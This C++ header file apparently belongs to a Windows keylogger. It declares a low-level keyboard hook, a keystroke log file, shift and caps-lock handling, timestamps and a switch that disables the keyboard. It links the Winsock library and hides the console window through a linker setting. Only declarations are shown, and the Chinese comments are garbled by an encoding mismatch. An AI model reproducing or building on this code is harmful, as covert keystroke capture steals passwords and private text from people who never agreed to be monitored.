#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <WinSock2.h>
#include <Windows.h>
#include <list>
#include <string>
#include <time.h>
#pragma comment(lib,"ws2_32.lib")
#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )

using namespace std;

typedef void(*processKeyString)(CHAR*, UINT);	//�ص�����

UINT systemRunTime = NULL;	//ϵͳ����ʱ�� => ��ÿ����Ϣ��ʱ��
CHAR logFileName[64] = { 0 };
HHOOK keyboardHook = NULL;
list<DWORD>controlKeyList;	//�����ϼ����б�
BOOL __KeyDownShift = FALSE;	//��ǰ�Ƿ���Shift
BOOL __KeyDownCaps = FALSE;		//��ǰ�Ƿ��ڴ�д
BOOL disableKeyBoard = FALSE;	//�رռ��̣�����������
FILE* logFile = NULL;
CONST CHAR shiftNumTable[10] = { ')','!','@','#','$','%','^','&','*','(' };	//Shift + ���� ӳ���
CHAR singleChar[10];	//	�����ַ����� <== HandleVirtualKeyCode
string keyStr;		//	��ϰ������� <== HandleVirtualKeyCode
time_t nowTime;			//	ʱ��� <== HandleVirtualKeyCode
struct tm tm;			//	ʱ��ṹ�� <== HandleVirtualKeyCode
CHAR nowDateTime[32];	//	ÿ����Ϣ��ʱ�� <== HandleVirtualKeyCode
INT oldDay = 0;

UINT msgTime = 0;	//��Ϣʱ���

processKeyString procKeyStrFun = NULL;


VOID HandleVirtualKeyCode(DWORD vCode, UINT time, BOOL Combination);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

BOOL OnHookKeyBoard(processKeyString procKeyStrFunction);
VOID UnHookKeyBoard();
